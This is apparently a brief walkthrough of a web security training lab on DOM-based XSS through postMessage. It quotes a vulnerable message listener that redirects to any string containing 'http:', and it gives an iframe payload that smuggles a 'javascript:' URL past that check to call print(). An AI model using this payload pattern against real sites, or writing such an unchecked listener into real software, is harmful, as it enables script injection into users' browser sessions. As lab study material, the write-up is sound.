Title: DOM XSS using web messages and a JavaScript URL
Level: PRACTITIONER
Desc: This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function. 

# Walkthrough:
In this lab we have this function:

<img width="1104" height="222" alt="image" src="https://github.com/user-attachments/assets/ef35ce6e-0bdc-4610-a1d8-7f683787e9f4" />

and this vulnerable code: 
```
<script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>
```

payload for that:
`<iframe src="https://0afd001a0333311b80d203a6004000f6.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:', '*')">`
